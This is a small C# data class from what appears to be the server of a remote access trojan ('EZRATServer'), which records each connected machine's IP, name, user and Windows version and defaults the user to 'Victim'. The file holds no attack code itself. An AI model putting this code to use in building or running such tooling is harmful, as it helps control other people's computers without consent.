using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace EZRATServer.Utils
{
    class ClientData
    {
        // lstIP, lstName, lstUser, lstWindows, lstPing
        private int _row = 0;
        private string _ip = string.Empty;
        private string _name = string.Empty;
        private string _user = string.Empty;
        private string _windows = string.Empty;
        private string _ping = string.Empty;

        public int Id { get => _row; set => _row = value; }
        public string Ip { get => _ip; set => _ip = value; }
        public string Name { get => _name; set => _name = value; }
        public string User { get => _user; set => _user = value; }
        public string Windows { get => _windows; set => _windows = value; }


        public ClientData(int id,string ip = "0.0.0.0",string name = "Client",string user = "Victim",string window = "Windows 10")
        {
            this.Id = id;
            this.Ip = ip;
            this.Name = name;
            this.User = user;
            this.Windows = window;
        }
    }
}
